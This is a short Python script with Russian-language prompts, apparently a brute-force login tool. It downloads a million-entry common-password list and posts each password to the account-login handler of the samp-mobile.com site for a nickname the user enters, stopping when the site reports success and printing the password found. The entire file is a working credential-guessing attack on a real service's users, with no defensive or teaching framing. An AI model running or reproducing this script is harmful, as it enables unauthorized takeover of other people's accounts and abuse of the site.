import aiohttp
import asyncio


async def main():
    session = aiohttp.ClientSession()
    userName = input('Никнейм: ')
    base = await session.get('https://raw.githubusercontent.com/berandal666/Passwords/master/10_million_password_list_top_1000000.txt')
    base = await base.text()
    base = base.split()
    for userPassword in base:
        print('Текущий пароль: {}'.format(userPassword))
        data = {
            "user_name" : userName,
            "user_password" : userPassword,
            "act" : "account_login"
        }
        response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
        response = await response.json()
        status = response['status']
        if status == 'ok':
            print('Верный пароль: {}'.format(userPassword))
            input()
            exit()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())